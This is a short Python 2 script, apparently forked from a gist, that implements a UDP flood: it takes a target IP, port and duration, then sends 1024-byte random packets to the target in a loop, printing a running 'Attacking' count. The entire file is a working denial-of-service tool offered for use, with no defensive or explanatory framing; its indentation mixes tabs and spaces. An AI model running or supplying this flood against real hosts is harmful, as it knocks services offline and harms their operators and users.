"""
Usage : ./flood_udp <ip> <port> <second> 
No error handling
Forked from https://gist.github.com/Ananasr/e05f3286b6ab94ec2c5431e64832c13e
"""

import time
import socket
import random
import sys

def usage():
	"""
	Takes no variables
	Returns: Usage : ./flood_udp <ip> <port> <second> 
	Then breaks
	No error handling
	"""

    print "Usage: " + sys.argv[0] + " <ip> <port> <second>"

def stream(target, port, duration):
	"""
	Takes an ip, port, and the duraction of the attack in seconds as input when called - in that order
	Returns: Prints out the attack duration
	Launches a series of udp packets to the victim IP and port
	times out after zero success for specified duration
	No error handling
	"""

    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # DGRAM refers to UDP

    bytes = random._urandom(1024) # gets random assortment of byte to send the server
    timeout =  time.time() + duration # get the timeout if the host is unreachable after specified duration
    sent = 0

    while True:
        if time.time() > timeout: # If the timeout is exceeded break the process
            break 
        else:
            pass
        client.sendto(bytes, (target, port))
        sent = sent + 1
        print "Attacking %s sent packages %s at the port %s "%(sent, target, port)

def main():
    print len(sys.argv)
    if len(sys.argv) != 4: # If we have too many or too few arguments throw our useage statement and break
        usage()
    else:
        stream(sys.argv[1], int(sys.argv[2]), int(sys.argv[3])) #argv[0] is the name of the program while 1-3 are variables entered by the user

if __name__ == '__main__':
    main()
